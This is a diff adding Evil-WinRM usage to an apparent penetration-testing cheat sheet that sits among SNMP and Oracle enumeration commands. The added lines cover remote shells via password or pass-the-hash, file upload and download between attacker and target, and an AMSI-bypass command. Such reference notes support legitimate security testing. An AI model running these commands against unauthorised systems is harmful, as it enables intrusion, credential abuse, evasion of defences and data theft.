@@ -220,6 +220,21 @@ snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25 # Queries the SNMP OID fo
 onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings on the target host.
 braa <community string>@<target>:.1.3.6.* # Performs a fast bulk SNMP walk starting from the specified OID branch, faster than snmpwalk for large-scale enumeration
 
+## Evil-WinRM
+evil-winrm -i <target> -u <user> -p <password> # Connects to the target over WinRM using valid credentials, dropping into a PowerShell-like shell
+evil-winrm -i <target> -u <user> -H <NTLM hash> # Connects using pass-the-hash instead of a password
+evil-winrm -i <target> -u <user> -p <password> -s <local scripts folder> # Loads a local folder of PowerShell scripts, available inside the session
+evil-winrm -i <target> -u <user> -p <password> -e <local executables folder> # Loads a local folder of executables, available inside the session
+evil-winrm -i <target> -u <user> -p <password> -c <cert path> -k <key path> # Connects using SSL client certificate authentication
+evil-winrm -i <target> -u <user> -p <password> -P <port> # Connects on a non-default WinRM port
+
+### Evil-WinRM shell
+
+menu # Displays the list of built-in commands (upload, download, etc.)
+upload <local file> <remote path> # Uploads a file from the attacker machine to the target
+download <remote file> <local path> # Downloads a file from the target to the attacker machine
+Bypass-4MSI # Attempts to bypass AMSI
+
 ## Oracle Database Enumeration
 sqlplus <user>/<password>@<target>/<SID> # Connects to an Oracle database using SQL*Plus with a valid username, password, target IP, and SID
 sqlplus scott/tiger@<target>/XE # Connects using the well-known default Oracle credentials (scott/tiger) against the XE SID
